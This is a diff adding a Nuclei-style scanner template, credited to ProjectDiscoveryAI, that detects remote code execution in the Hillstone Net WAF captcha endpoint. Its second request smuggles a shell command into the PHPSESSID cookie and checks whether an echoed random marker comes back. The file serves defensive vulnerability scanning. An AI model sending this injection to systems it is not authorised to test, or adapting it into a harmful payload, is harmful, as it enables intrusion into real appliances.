@@ -1,0 +1,54 @@
+id: hillstonenet-waf-captcha-rce
+info:
+  name: Hillstone Net WAF Captcha Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  metadata:
+    product: Hillstone Net WAF
+
+variables:
+  payload: '{{md5(rand_int(1000, 10000))}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: captcha-check
+    method: GET
+    path:
+      - "{{BaseURL}}/rest/captcha"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "PNG"
+
+  - id: captcha-rce
+    method: GET
+    path:
+      - "{{BaseURL}}/rest/captcha"
+    headers:
+      Cookie: 'PHPSESSID=aaaaaaaaaa%3becho${IFS}{{payload}}%3bd'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{payload}}'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "PNG"
+      - type: word
+        part: header
+        words:
+          - "image/png"
